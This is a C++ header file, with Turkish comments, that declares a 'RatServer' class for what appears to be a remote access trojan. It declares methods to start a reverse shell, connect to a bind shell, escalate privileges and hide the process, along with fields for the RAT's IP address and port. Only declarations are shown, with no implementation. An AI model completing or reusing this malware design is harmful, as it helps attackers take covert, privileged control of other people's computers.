#ifndef __TEM_RAT_HPP__
#define __TEM_RAT_HPP__

#include "csock.hpp"
#include "temDefines.hpp"

#include <vector>

class RatServer{
private:
    TEM_TARGET_OS targetOs;    
    
    std::vector<std::vector<char*>> interfaceIPV4;
    std::string ratIP;

    uint ratPort;


   
public:
    RatServer(uint ratPort,const char *ratIP,TEM_TARGET_OS targetOs); //rat serveri baslatir
    
    bool temReverseShell();                                           //reverse shell baslatir
    bool temBindShell();                            //bind shell portuna baglanir

    bool temPrivilegeEscalation();                  //yetki yukseltme
    bool temMigrateProcess();                       //processi saklama

    
};


#endif 